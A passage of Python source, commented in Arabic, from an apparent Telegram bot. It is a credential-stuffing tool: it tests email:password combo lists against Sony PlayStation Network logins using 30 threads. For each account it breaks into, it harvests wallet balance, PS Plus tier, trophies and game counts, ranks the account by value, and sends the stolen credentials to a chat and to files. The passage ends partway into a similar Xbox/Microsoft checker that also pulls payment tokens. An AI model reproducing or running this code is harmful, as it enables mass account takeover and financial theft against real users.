        _stopped_msg(token, cid, prog_mid, hits+locked, checked, total, "PSN Checker v3")
        sess(cid)["state"] = "idle"
        return
    all_hits = hits + locked
    _send_checker_results(token, cid, all_hits, total, checked, bad, errors,
                          "PSN Checker v3", "psn_hits.txt")
    sess(cid)["state"] = "idle"


# ══════════════════════════════════════════════════════════════════════════════
# 🔱 PSN ULTRA LEGEND CHECKER — الفاحص الأسطوري الموحّد
# ══════════════════════════════════════════════════════════════════════════════
#
#  يجمع كل فحوصات PlayStation في منظومة واحدة:
#  1. Sony OAuth مباشر (PSN API)  → أسرع مسار
#  2. الملف الشخصي الكامل        → Online ID / Region / Bio / Avatar
#  3. PS Plus دقيق               → Essential / Extra / Premium + تاريخ الانتهاء
#  4. رصيد المحفظة               → بالعملة المحلية
#  5. الكؤوس (Trophies)          → Platinum / Gold / Silver / Bronze + المستوى
#  6. مكتبة الألعاب              → عدد الألعاب المملوكة
#  7. عدد الأصدقاء
#  8. فحص Sony Rewards           → مسجل / غير مسجل
#  9. كشف 2FA / Bypass
#  10. تصنيف ثلاثي للنتائج:
#       🔱 LEGENDARY — Plus Premium/Extra + رصيد + كؤوس
#       🥇 GOLD      — Plus Essential فأعلى
#       🥈 SILVER    — حساب صالح بدون Plus
#       🔐 2FA       — يحتاج تجاوز
#       ❌ BAD       — بيانات خاطئة
# ══════════════════════════════════════════════════════════════════════════════

_PSN_ANDROID_UA  = "com.scee.psxandroid.sceuebc/11.8.2 (Android/12; Sony/SOG07)"
_PSN_CLIENT_ID   = "09515159-7237-4370-9b40-3806e67c0891"
_PSN_GRAPH_BASE  = "https://m.np.playstation.com/api/graphql/v1/op"

# Hash للاستعلامات الـ GraphQL
_PSN_HASH_SUBS   = "e0d4eded7ea7d69a33c65bade05bfb43ecdcf9cd99de4e8fa29e56da24a4d8b9"
_PSN_HASH_WALLET = "512f05d93ccb0f6b0b218d9741c2f2b862f33df63e41a3b6ca9b38c3df96b5e2"
_PSN_HASH_TROPHY = "efa3f093cde1e802a293c6a8e9dcc7adb6d1c9e5c1b0db5f03f6e9a2b4d8c1f7"


def _psn_legend_sony_login(email: str, password: str) -> tuple:
    """
    تسجيل دخول مباشر عبر Sony OAuth.
    يُعيد (status, access_token, npsso)
    status: 'hit' | 'bad' | '2fa' | 'error'
    """
    try:
        hdrs = {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent":   _PSN_ANDROID_UA,
            "X-Platform":   "Android",
            "Accept":       "application/json",
        }
        r = requests.post(
            "https://ca.account.sony.com/api/authz/v3/oauth/token",
            data={
                "authentication_type": "password",
                "client_id":           _PSN_CLIENT_ID,
                "grant_type":          "password",
                "scope":               "psn:mobile.v1 psn:clientapp psn:clientapp.ps5",
                "username":            email,
                "password":            password,
            },
            headers=hdrs, timeout=15,
        )
        if r.status_code == 400:
            body = ""
            try:
                body = r.json().get("error_description","").lower()
            except Exception:
                body = r.text.lower()
            if "account is temporarily locked" in body:
                return "locked", None, None
            if "two-step" in body or "2fa" in body or "verification" in body:
                return "2fa", None, None
            return "bad", None, None
        if r.status_code != 200:
            return "error", None, None
        j = r.json()
        access_token = j.get("access_token", "")
        npsso        = j.get("refresh_token", "")
        if not access_token:
            return "error", None, None
        return "hit", access_token, npsso
    except Exception:
        return "error", None, None


def _psn_legend_profile(access_token: str) -> dict:
    """جلب الملف الشخصي الكامل من PSN."""
    hdrs = {
        "Authorization": f"Bearer {access_token}",
        "User-Agent":    _PSN_ANDROID_UA,
        "Accept":        "application/json",
    }
    info = {
        "online_id": "N/A", "country": "N/A",
        "about_me": "", "avatar_url": "",
        "is_ps_plus_active": False,
        "account_id": "N/A",
    }
    try:
        r = requests.get(
            "https://m.np.playstation.com/api/userProfile/v1/internal/users/me/profiles",
            headers=hdrs, timeout=12,
        )
        if r.status_code == 200:
            d = r.json()
            info["online_id"]   = d.get("onlineId", "N/A")
            info["country"]     = d.get("region", "N/A")
            info["about_me"]    = d.get("aboutMe", "")
            info["account_id"]  = d.get("accountId", "N/A")
            # Avatar
            for av in d.get("avatars", []):
                if av.get("size") == "xl":
                    info["avatar_url"] = av.get("url", "")
                    break
            if not info["avatar_url"] and d.get("avatars"):
                info["avatar_url"] = d["avatars"][0].get("url", "")
    except Exception:
        pass
    return info


def _psn_legend_psplus(access_token: str) -> dict:
    """جلب تفاصيل PS Plus الدقيقة (Essential/Extra/Premium)."""
    hdrs = {
        "Authorization": f"Bearer {access_token}",
        "User-Agent":    _PSN_ANDROID_UA,
        "Origin":        "https://www.playstation.com",
        "Referer":       "https://www.playstation.com/",
        "Accept":        "application/json",
    }
    result = {
        "psplus": False, "tier": "None",
        "tier_label": "لا Plus", "exp_date": "N/A",
        "auto_renew": False,
    }
    _TIER_LABELS = {
        "essential": "🎮 Essential",
        "extra":     "🎮 Extra",
        "premium":   "👑 Premium",
        "deluxe":    "👑 Deluxe",
    }
    try:
        url = (
            f"{_PSN_GRAPH_BASE}?extensions=%7B%22persistedQuery%22%3A%7B"
            f"%22version%22%3A1%2C%22sha256Hash%22%3A%22{_PSN_HASH_SUBS}%22%7D%7D"
        )
        r = requests.get(url, headers=hdrs, timeout=12)
        if r.status_code != 200:
            return result
        products = (
            r.json()
            .get("data", {})
            .get("subscriptionProductQuery", {})
            .get("products", [])
        )
        for prod in products:
            name = prod.get("productName", "").lower()
            if "playstation plus" in name or "ps plus" in name:
                result["psplus"]     = True
                result["exp_date"]   = prod.get("endDate", "N/A")
                result["auto_renew"] = bool(prod.get("autoRenew", False))
                raw_name             = prod.get("productName", "")
                result["tier"]       = raw_name
                for key, label in _TIER_LABELS.items():
                    if key in name:
                        result["tier_label"] = label
                        break
                else:
                    result["tier_label"] = "🎮 Plus"
                break
    except Exception:
        pass
    return result


def _psn_legend_wallet(access_token: str) -> str:
    """جلب رصيد المحفظة بالعملة المحلية."""
    hdrs = {
        "Authorization": f"Bearer {access_token}",
        "User-Agent":    _PSN_ANDROID_UA,
        "Origin":        "https://www.playstation.com",
        "Referer":       "https://www.playstation.com/",
        "Accept":        "application/json",
    }
    try:
        url = (
            f"{_PSN_GRAPH_BASE}?extensions=%7B%22persistedQuery%22%3A%7B"
            f"%22version%22%3A1%2C%22sha256Hash%22%3A%22{_PSN_HASH_WALLET}%22%7D%7D"
        )
        r = requests.get(url, headers=hdrs, timeout=10)
        if r.status_code == 200:
            w = (
                r.json()
                .get("data", {})
                .get("wallet", {})
                .get("totalBalance", {})
            )
            val = w.get("formattedValue") or w.get("value")
            if val:
                return str(val)
    except Exception:
        pass
    # Fallback: v2 wallet endpoint
    try:
        r2 = requests.get(
            "https://m.np.playstation.com/api/payment/v1/webPayment/wallet",
            headers=hdrs, timeout=10,
        )
        if r2.status_code == 200:
            d2 = r2.json()
            bal = (d2.get("totalBalance") or
                   (d2.get("wallet") or {}).get("balance") or
                   d2.get("balance"))
            if bal is not None:
                return str(bal)
    except Exception:
        pass
    return "N/A"


def _psn_legend_trophies(access_token: str) -> dict:
    """جلب إحصائيات الكؤوس الكاملة."""
    hdrs = {
        "Authorization": f"Bearer {access_token}",
        "User-Agent":    _PSN_ANDROID_UA,
        "Accept":        "application/json",
    }
    result = {
        "level": 0, "progress": 0,
        "platinum": 0, "gold": 0, "silver": 0, "bronze": 0,
        "total": 0,
    }
    try:
        r = requests.get(
            "https://m.np.playstation.com/api/trophy/v1/users/me/trophySummary",
            headers=hdrs, timeout=10,
        )
        if r.status_code == 200:
            d  = r.json()
            ea = d.get("earnedTrophies", {})
            result["level"]    = d.get("trophyLevel", 0)
            result["progress"] = d.get("progress", 0)
            result["platinum"] = ea.get("platinum", 0)
            result["gold"]     = ea.get("gold", 0)
            result["silver"]   = ea.get("silver", 0)
            result["bronze"]   = ea.get("bronze", 0)
            result["total"]    = (result["platinum"] + result["gold"] +
                                  result["silver"]   + result["bronze"])
    except Exception:
        pass
    return result


def _psn_legend_games_count(access_token: str) -> int:
    """عدد الألعاب في مكتبة المستخدم."""
    hdrs = {
        "Authorization": f"Bearer {access_token}",
        "User-Agent":    _PSN_ANDROID_UA,
        "Accept":        "application/json",
    }
    try:
        r = requests.get(
            "https://m.np.playstation.com/api/gamelist/v2/users/me/titles"
            "?categories=ps4_game,ps5_native_game,unknown&limit=1&offset=0",
            headers=hdrs, timeout=10,
        )
        if r.status_code == 200:
            return r.json().get("totalItemCount", 0)
    except Exception:
        pass
    return 0


def _psn_legend_friends_count(access_token: str) -> int:
    """عدد الأصدقاء."""
    hdrs = {
        "Authorization": f"Bearer {access_token}",
        "User-Agent":    _PSN_ANDROID_UA,
        "Accept":        "application/json",
    }
    try:
        r = requests.get(
            "https://m.np.playstation.com/api/userProfile/v1/internal/users/me/friends"
            "?limit=1&offset=0",
            headers=hdrs, timeout=8,
        )
        if r.status_code == 200:
            return r.json().get("totalItemCount", 0)
    except Exception:
        pass
    return 0


def _psn_legend_rewards_check(email: str) -> bool:
    """فحص تسجيل الحساب في Sony Rewards."""
    try:
        s = requests.Session()
        r0 = s.get(
            "https://www.rewards.sony.com/UID-Start",
            headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0)"
                                   " Gecko/20100101 Firefox/132.0"},
            timeout=10,
        )
        csrf = ""
        try:
            m = re.search(r'csrf_token[^>]+value="([^"]+)"', r0.text)
            if m:
                csrf = m.group(1)
        except Exception:
            pass
        if not csrf:
            return False
        r1 = s.post(
            "https://www.rewards.sony.com/UID-SubmitEmail",
            data=(
                f"dwfrm_uidloginemail_email={urllib.parse.quote(email)}"
                f"&g-recaptcha-response=&dwfrm_uidloginemail_send=Next"
                f"&csrf_token={urllib.parse.quote(csrf)}"
            ),
            headers={
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0)"
                              " Gecko/20100101 Firefox/132.0",
                "Origin": "https://www.rewards.sony.com",
                "Referer": "https://www.rewards.sony.com/UID-Start",
            },
            timeout=12, allow_redirects=True,
        )
        # إذا طلب كلمة المرور = الحساب مسجّل
        return ("password" in r1.url.lower() or
                "login"    in r1.url.lower() or
                "signin"   in r1.url.lower())
    except Exception:
        return False


def _psn_legend_classify(psplus: bool, tier_label: str,
                          wallet_str: str, trophies: dict) -> str:
    """تصنيف الحساب إلى رتبة (LEGENDARY / GOLD / SILVER)."""
    has_wallet = (wallet_str not in ("N/A", "0", "0.00", "$0.00", "€0.00",
                                      "£0.00", "¥0", "₩0", "") and
                  wallet_str != "N/A")
    has_premium = any(k in tier_label.lower() for k in ("premium", "deluxe", "extra"))
    has_trophies = trophies.get("total", 0) > 0
    if psplus and has_premium and (has_wallet or has_trophies):
        return "legendary"
    if psplus:
        return "gold"
    return "silver"


def _psn_legend_check_full(email: str, password: str) -> dict:
    """
    الفحص الكامل لحساب PlayStation واحد.
    يُعيد dict يحتوي على كل المعلومات + status.
    """
    out = {
        "status":        "bad",   # bad | hit | 2fa | locked | error
        "rank":          "silver",
        "online_id":     "N/A",
        "country":       "N/A",
        "about_me":      "",
        "psplus":        False,
        "tier_label":    "لا Plus",
        "exp_date":      "N/A",
        "auto_renew":    False,
        "wallet":        "N/A",
        "trophies":      {},
        "games_count":   0,
        "friends_count": 0,
        "rewards":       False,
        "access_token":  "",
    }

    # ── الخطوة 1: تسجيل دخول Sony OAuth ──────────────────────────────────────
    login_status, access_token, _ = _psn_legend_sony_login(email, password)

    if login_status == "2fa":
        out["status"] = "2fa"
        return out
    if login_status == "locked":
        out["status"] = "locked"
        return out
    if login_status in ("bad", "error"):
        out["status"] = login_status
        return out

    out["status"]       = "hit"
    out["access_token"] = access_token

    # ── الخطوة 2: جمع كل البيانات بالتوازي ───────────────────────────────────
    profile_data = {}
    psplus_data  = {}
    wallet_str   = "N/A"
    trophies     = {}
    games_count  = 0
    friends_count= 0
    rewards_reg  = False

    def _fetch_profile():
        nonlocal profile_data
        profile_data = _psn_legend_profile(access_token)

    def _fetch_psplus():
        nonlocal psplus_data
        psplus_data = _psn_legend_psplus(access_token)

    def _fetch_wallet():
        nonlocal wallet_str
        wallet_str = _psn_legend_wallet(access_token)

    def _fetch_trophies():
        nonlocal trophies
        trophies = _psn_legend_trophies(access_token)

    def _fetch_games():
        nonlocal games_count
        games_count = _psn_legend_games_count(access_token)

    def _fetch_friends():
        nonlocal friends_count
        friends_count = _psn_legend_friends_count(access_token)

    def _fetch_rewards():
        nonlocal rewards_reg
        rewards_reg = _psn_legend_rewards_check(email)

    threads_fetch = [
        threading.Thread(target=_fetch_profile,  daemon=True),
        threading.Thread(target=_fetch_psplus,   daemon=True),
        threading.Thread(target=_fetch_wallet,   daemon=True),
        threading.Thread(target=_fetch_trophies, daemon=True),
        threading.Thread(target=_fetch_games,    daemon=True),
        threading.Thread(target=_fetch_friends,  daemon=True),
        threading.Thread(target=_fetch_rewards,  daemon=True),
    ]
    for t in threads_fetch:
        t.start()
    for t in threads_fetch:
        t.join(timeout=18)

    # ── دمج النتائج ───────────────────────────────────────────────────────────
    out.update({
        "online_id":     profile_data.get("online_id",  "N/A"),
        "country":       profile_data.get("country",    "N/A"),
        "about_me":      profile_data.get("about_me",   ""),
        "psplus":        psplus_data.get("psplus",      False),
        "tier_label":    psplus_data.get("tier_label",  "لا Plus"),
        "exp_date":      psplus_data.get("exp_date",    "N/A"),
        "auto_renew":    psplus_data.get("auto_renew",  False),
        "wallet":        wallet_str,
        "trophies":      trophies,
        "games_count":   games_count,
        "friends_count": friends_count,
        "rewards":       rewards_reg,
    })

    # ── التصنيف النهائي ───────────────────────────────────────────────────────
    out["rank"] = _psn_legend_classify(
        out["psplus"], out["tier_label"], out["wallet"], trophies
    )

    return out


def _psn_legend_hit_text(email: str, password: str, d: dict) -> str:
    """بناء رسالة الهيت الكاملة للإرسال عبر التيليغرام."""
    rank = d.get("rank", "silver")
    rank_icons = {
        "legendary": "🔱", "gold": "🥇", "silver": "🥈",
    }
    rank_labels = {
        "legendary": "LEGENDARY", "gold": "GOLD", "silver": "SILVER",
    }
    icon  = rank_icons.get(rank, "🥈")
    label = rank_labels.get(rank, "SILVER")

    tr = d.get("trophies", {})
    trophy_str = (
        f"🏆{tr.get('platinum',0)} 🥇{tr.get('gold',0)} "
        f"🥈{tr.get('silver',0)} 🥉{tr.get('bronze',0)}"
        f" (Lv.{tr.get('level',0)})"
        if tr.get("total", 0) > 0
        else "لا كؤوس"
    )

    rewards_str = "✅ مسجّل" if d.get("rewards") else "❌ لا"
    auto_str    = "✅" if d.get("auto_renew") else "❌"
    about_part  = (f"\n💬 Bio: <i>{esc(d['about_me'][:60])}</i>"
                   if d.get("about_me") else "")

    plus_section = ""
    if d.get("psplus"):
        plus_section = (
            f"\n{'═'*26}\n"
            f"🎮 <b>PS Plus</b>\n"
            f"  ├ الخطة    : <b>{esc(d['tier_label'])}</b>\n"
            f"  ├ ينتهي    : <code>{esc(d['exp_date'][:10]) if d['exp_date'] != 'N/A' else 'N/A'}</code>\n"
            f"  └ تجديد تلقائي: {auto_str}"
        )

    return (
        f"{icon} <b>PSN ULTRA — {label}!</b>\n"
        f"{'═'*26}\n"
        f"📧 <code>{esc(email)}</code>\n"
        f"🔑 <code>{esc(password)}</code>\n"
        f"{'═'*26}\n"
        f"👤 Online ID  : <b>{esc(d['online_id'])}</b>\n"
        f"🌍 Region     : <b>{esc(d['country'])}</b>"
        f"{about_part}\n"
        f"{'═'*26}\n"
        f"💳 Wallet     : <b>{esc(d['wallet'])}</b>\n"
        f"🏅 Trophies   : {trophy_str}\n"
        f"🎮 Games      : <b>{d['games_count']:,}</b>\n"
        f"👥 Friends    : <b>{d['friends_count']:,}</b>\n"
        f"🎁 Rewards    : {rewards_str}"
        f"{plus_section}\n"
        f"{'═'*26}\n"
        f"💎 {MY_SIGNATURE}"
    )


def _psn_legend_hit_line(email: str, password: str, d: dict) -> str:
    """سطر الهيت للملف النصي."""
    rank   = d.get("rank", "silver")
    tr     = d.get("trophies", {})
    return (
        f"[{rank.upper()}] {email}:{password} | "
        f"ID:{d['online_id']} | Region:{d['country']} | "
        f"Plus:{d['psplus']}({d['tier_label']}) | Exp:{d['exp_date'][:10] if d['exp_date']!='N/A' else 'N/A'} | "
        f"Wallet:{d['wallet']} | "
        f"Pt:{tr.get('platinum',0)} Go:{tr.get('gold',0)} "
        f"Si:{tr.get('silver',0)} Br:{tr.get('bronze',0)} Lv:{tr.get('level',0)} | "
        f"Games:{d['games_count']} | Friends:{d['friends_count']} | "
        f"Rewards:{'YES' if d['rewards'] else 'NO'}"
    )


def run_psn_legend_checker(token, cid, lines):
    """
    🔱 PSN ULTRA LEGEND CHECKER — يجمع كل فحوصات PlayStation.
    """
    total    = len(lines)
    lock     = threading.Lock()
    start_ts = time.time()
    stop_ev  = get_stop_event(cid)

    # ── إحصائيات ──────────────────────────────────────────────────────────────
    stats = {
        "legendary": 0, "gold": 0, "silver": 0,
        "twofa": 0, "locked": 0, "bad": 0, "errors": 0,
        "checked": 0,
    }
    # CPM window
    _cpm_deque = _collections.deque()
    _cpm_lock  = threading.Lock()

    # ── ملفات النتائج ─────────────────────────────────────────────────────────
    res_dir = f"Results/{cid}"
    os.makedirs(res_dir, exist_ok=True)
    ts_tag  = int(time.time())
    _files  = {
        "legendary": f"{res_dir}/PSN_LEGEND_🔱_{ts_tag}.txt",
        "gold":      f"{res_dir}/PSN_GOLD_🥇_{ts_tag}.txt",
        "silver":    f"{res_dir}/PSN_SILVER_🥈_{ts_tag}.txt",
        "twofa":     f"{res_dir}/PSN_2FA_{ts_tag}.txt",
    }
    header = (
        f"{'═'*50}\n"
        f"🔱 PSN ULTRA LEGEND CHECKER — {MY_SIGNATURE}\n"
        f"📅 {datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M UTC')}\n"
        f"{'═'*50}\n\n"
    )
    for label, rank_label in [
        ("legendary", "🔱 LEGENDARY Accounts"),
        ("gold",      "🥇 GOLD Accounts"),
        ("silver",    "🥈 SILVER Accounts"),
        ("twofa",     "🔐 2FA / Bypass"),
    ]:
        with open(_files[label], "w", encoding="utf-8") as f:
            f.write(header.replace("PSN ULTRA LEGEND CHECKER", rank_label))

    def _save(category: str, line: str):
        fp = _files.get(category)
        if fp:
            with open(fp, "a", encoding="utf-8") as f:
                f.write(line + "\n")

    def _cpm_tick():
        now = time.time()
        with _cpm_lock:
            _cpm_deque.append(now)
            while _cpm_deque and _cpm_deque[0] < now - 60:
                _cpm_deque.popleft()

    def _cpm_val():
        now = time.time()
        with _cpm_lock:
            elapsed = min(now - start_ts, 60.0)
            if elapsed < 1:
                return 0
            return int(len(_cpm_deque) / elapsed * 60)

    # ── رسالة التقدم الأولى ───────────────────────────────────────────────────
    prog_mid = _send_msg_id(token, cid,
        f"╔{'═'*32}╗\n"
        f"║  🔱  <b>PSN ULTRA LEGEND CHECKER</b>  🔱  ║\n"
        f"╠{'═'*32}╣\n"
        f"║  📋 إجمالي الكومبو : <b>{total:,}</b>\n"
        f"║  ⏳ جارٍ التهيئة...\n"
        f"╚{'═'*32}╝",
        reply_markup=_stop_markup())

    def _update_progress(force: bool = False):
        now = time.time()
        with lock:
            s = dict(stats)
        elapsed = max(int(now - start_ts), 1)
        cpm     = _cpm_val()
        checked = s["checked"]
        total_hits = s["legendary"] + s["gold"] + s["silver"]
        pct     = checked / total * 100 if total else 0
        eta_str = "—"
        if cpm > 0 and checked < total:
            eta_s   = int((total - checked) / cpm * 60)
            m_, s_  = divmod(eta_s, 60)
            eta_str = f"{m_}m {s_}s" if m_ else f"{s_}s"
        h_el, r_el = divmod(elapsed, 3600)
        m_el, s_el = divmod(r_el, 60)
        el_str = (f"{h_el}h {m_el}m {s_el}s" if h_el else f"{m_el}m {s_el}s")
        filled = int(pct / 100 * 24)
        bar    = "█" * filled + "░" * (24 - filled)

        msg = (
            f"╔{'═'*32}╗\n"
            f"║  🔱  <b>PSN ULTRA LEGEND CHECKER</b>  ║\n"
            f"╠{'═'*32}╣\n"
            f"║  🔱 Legendary : <b>{s['legendary']:>5,}</b>\n"
            f"║  🥇 Gold      : <b>{s['gold']:>5,}</b>\n"
            f"║  🥈 Silver    : <b>{s['silver']:>5,}</b>\n"
            f"║  🔐 2FA       : <b>{s['twofa']:>5,}</b>\n"
            f"║  🔒 Locked    : <b>{s['locked']:>5,}</b>\n"
            f"║  ❌ Bad       : <b>{s['bad']:>5,}</b>\n"
            f"║  ⚠️  Errors    : <b>{s['errors']:>5,}</b>\n"
            f"╠{'═'*32}╣\n"
            f"║  📊 [{bar}] {pct:.1f}%\n"
            f"║  📋 {checked:,} / {total:,}\n"
            f"║  ⚡ CPM      : <b>{cpm:,}</b>\n"
            f"║  ⏱️ وقت     : {el_str}\n"
            f"║  🕐 متبقي   : {eta_str}\n"
            f"╚{'═'*32}╝\n"
            f"💎 {MY_SIGNATURE}"
        )
        done = checked >= total
        edit_message(token, cid, prog_mid, msg,
                     reply_markup=None if done else _stop_markup())

    # ── فحص حساب واحد ────────────────────────────────────────────────────────
    def check_one(line: str):
        if stop_ev.is_set():
            return
        parts = line.strip().split(":", 1)
        if len(parts) < 2:
            with lock:
                stats["bad"]     += 1
                stats["checked"] += 1
            return
        email, password = parts[0].strip(), parts[1].strip()
        if not email or not password:
            with lock:
                stats["bad"]     += 1
                stats["checked"] += 1
            return

        d = _psn_legend_check_full(email, password)
        _cpm_tick()

        with lock:
            stats["checked"] += 1
            status = d["status"]

            if status == "hit":
                rank = d["rank"]
                stats[rank] += 1
                hit_line = _psn_legend_hit_line(email, password, d)
                _save(rank, hit_line)

                # إشعار فوري
                try:
                    send_message(token, cid,
                        _psn_legend_hit_text(email, password, d))
                except Exception:
                    pass

            elif status == "2fa":
                stats["twofa"] += 1
                _save("twofa", f"🔐 {email}:{password}")
                send_message(token, cid,
                    f"🔐 <b>2FA/Bypass!</b>\n"
                    f"📧 <code>{esc(email)}</code>\n"
                    f"🔑 <code>{esc(password)}</code>\n"
                    f"⚡ يحتاج تجاوز\n💎 {MY_SIGNATURE}")

            elif status == "locked":
                stats["locked"] += 1

            elif status == "bad":
                stats["bad"] += 1

            else:
                stats["errors"] += 1

        # تحديث التقدم كل 4 ثوانٍ
        now = time.time()
        if not hasattr(check_one, "_last_upd"):
            check_one._last_upd = 0.0
        if now - check_one._last_upd > 4.0 or stats["checked"] >= total:
            check_one._last_upd = now
            try:
                _update_progress()
            except Exception:
                pass

    # ── تشغيل الـ Pool ────────────────────────────────────────────────────────
    ex = ThreadPoolExecutor(max_workers=30)
    futures = [ex.submit(check_one, l) for l in lines]
    stopped = False
    for fut in as_completed(futures):
        if stop_ev.is_set():
            stopped = True
            ex.shutdown(wait=False)
            break
        try:
            fut.result()
        except Exception:
            pass
    ex.shutdown(wait=False)

    # ── الرسالة الختامية ──────────────────────────────────────────────────────
    _update_progress(force=True)

    with lock:
        s = dict(stats)
    elapsed   = max(int(time.time() - start_ts), 1)
    avg_cpm   = int(s["checked"] / elapsed * 60)
    h_el, r   = divmod(elapsed, 3600)
    m_el, s_el= divmod(r, 60)
    el_str    = f"{h_el}h {m_el}m {s_el}s" if h_el else f"{m_el}m {s_el}s"
    total_hits= s["legendary"] + s["gold"] + s["silver"]
    stop_icon = "🛑" if stopped else "✅"

    summary = (
        f"{stop_icon} <b>{'أُوقف الفحص' if stopped else 'اكتمل الفحص!'}</b>\n\n"
        f"╔{'═'*32}╗\n"
        f"║  🔱  <b>PSN ULTRA LEGEND — النتائج</b>  ║\n"
        f"╠{'═'*32}╣\n"
        f"║  🔱 Legendary : <b>{s['legendary']:,}</b>\n"
        f"║  🥇 Gold      : <b>{s['gold']:,}</b>\n"
        f"║  🥈 Silver    : <b>{s['silver']:,}</b>\n"
        f"║  🔐 2FA       : <b>{s['twofa']:,}</b>\n"
        f"║  🔒 Locked    : <b>{s['locked']:,}</b>\n"
        f"║  ❌ Bad       : <b>{s['bad']:,}</b>\n"
        f"╠{'═'*32}╣\n"
        f"║  📊 مجموع    : <b>{s['checked']:,} / {total:,}</b>\n"
        f"║  🎯 هيتات    : <b>{total_hits:,}</b>\n"
        f"║  ⚡ CPM      : <b>{avg_cpm:,}</b>\n"
        f"║  ⏱️ وقت     : {el_str}\n"
        f"╚{'═'*32}╝\n"
        f"💎 {MY_SIGNATURE}"
    )
    send_message(token, cid, summary)

    # ── إرسال ملفات النتائج ───────────────────────────────────────────────────
    file_map = [
        ("legendary", f"🔱 {s['legendary']:,} حساب LEGENDARY"),
        ("gold",      f"🥇 {s['gold']:,} حساب GOLD"),
        ("silver",    f"🥈 {s['silver']:,} حساب SILVER"),
        ("twofa",     f"🔐 {s['twofa']:,} حساب 2FA"),
    ]
    for key, caption in file_map:
        count_key = key if key != "twofa" else "twofa"
        if s.get(count_key, 0) > 0 and os.path.exists(_files[key]):
            send_document(token, cid, _files[key],
                          caption=f"{caption}\n💎 {MY_SIGNATURE}")

    sess(cid)["state"] = "idle"


# ══════════════════════════════════════════════════════════════════════════════
# TOOL RUNNERS: Xbox Full Capture (standalone, from bot)
# ══════════════════════════════════════════════════════════════════════════════

_XBOX_SUB_KEYWORDS = [
    "Xbox Game Pass Ultimate","Xbox Game Pass Core","Xbox Game Pass Console",
    "PC Game Pass","Game Pass Premium","Game Pass Essential","Game Pass",
    "EA Play Pro","EA Play","Ubisoft+ Classics","Ubisoft+ Premium",
    "Xbox Live Gold","Xbox Cloud Gaming","Minecraft",
]

def _xbox_get_oauth_params(session, email):
    try:
        url = (
            "https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize"
            "?client_info=1&haschrome=1&login_hint=" + urllib.parse.quote(email, safe='') +
            "&mkt=en&response_type=code"
            "&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
            "&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
            "&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
        )
        r = session.get(url, headers={"User-Agent":"Mozilla/5.0","Accept-Language":"en-US,en;q=0.9"},
                        allow_redirects=True, timeout=15)
        url_m  = re.search(r'urlPost":"([^"]+)"', r.text)
        ppft_m = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r.text)
        if url_m and ppft_m:
            return url_m.group(1).replace("\\/","/"), ppft_m.group(1), r.url
    except Exception:
        pass
    return None, None, None

def _xbox_login_post(session, email, password, post_url, ppft, referer):
    try:
        _q = urllib.parse.quote
        login_data = (
            "i13=1&login=" + _q(email, safe='') + "&loginfmt=" + _q(email, safe='') +
            "&type=11&LoginOptions=1&passwd=" + _q(password, safe='') +
            "&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx="
            "&hpgrequestid=&PPFT=" + _q(ppft, safe='') + "&PPSX=PassportR&NewUser=1"
            "&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0"
            "&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960"
        )
        r = session.post(post_url, data=login_data, headers={
            "Content-Type":"application/x-www-form-urlencoded",
            "User-Agent":"Mozilla/5.0","Origin":"https://login.live.com",
            "Referer":referer
        }, allow_redirects=False, timeout=15)
        text = r.text
        if "account or password is incorrect" in text or text.count("error") > 3:
            return "bad", None
        if any(x in text for x in ["account.live.com/identity/confirm","recover?mkt","account.live.com/Abuse"]):
            return "2fa", None
        location = r.headers.get("Location","")
        code_m = re.search(r'code=([^&]+)', location)
        if code_m:
            return "ok", code_m.group(1)
        return "bad", None
    except Exception:
        return "error", None

def _xbox_exchange_token(session, code):
    try:
        r = session.post(
            "https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
            data=(
                "client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
                "&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
                "&grant_type=authorization_code&code=" + code +
                "&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
            ),
            headers={"Content-Type":"application/x-www-form-urlencoded"}, timeout=15)
        if "access_token" in r.text:
            return r.json().get("access_token")
    except Exception:
        pass
    return None

def _xbox_get_profile(session, access_token, cid_upper):
    try:
        r = session.get(
            "https://substrate.office.com/profileb2/v2.0/me/V1Profile",
            headers={"User-Agent":"Outlook-Android/2.0","Authorization":f"Bearer {access_token}",
                     "X-AnchorMailbox":f"CID:{cid_upper}","Accept":"application/json"}, timeout=12)
        if r.status_code == 200:
            data = r.json()
            name = data.get("displayName","") or "N/A"
            loc  = data.get("location","")
            country = loc.split(",")[-1].strip() if isinstance(loc,str) and loc else "N/A"
            return name, country
    except Exception:
        pass
    return "N/A", "N/A"

def _xbox_get_payment_token(session):
    try:
        state = json.dumps({"userId": str(uuid.uuid4()).replace('-','')[:16], "scopeSet":"pidl"})
        r = session.get(
            "https://login.live.com/oauth20_authorize.srf"
            "?client_id=000000000004773A&response_type=token"
            "&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete"
            "&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth"
            "&state=" + urllib.parse.quote(state) + "&prompt=none",
            headers={"User-Agent":"Mozilla/5.0","Referer":"https://account.microsoft.com/"
                     ,"Accept":"text/html,application/xhtml+xml"}, allow_redirects=True, timeout=18)
        search = r.text + " " + r.url
        for pat in [r'access_token=([^&\s"\']+)', r'"access_token":"([^"]+)"']:
            m = re.search(pat, search)
            if m:
                return urllib.parse.unquote(m.group(1))
    except Exception:
        pass
    return None

def _xbox_check_subs(session, payment_token):
    if not payment_token:
        return [], "N/A", "N/A"
    subs, balance, card_holder = [], "N/A", "N/A"
    try:
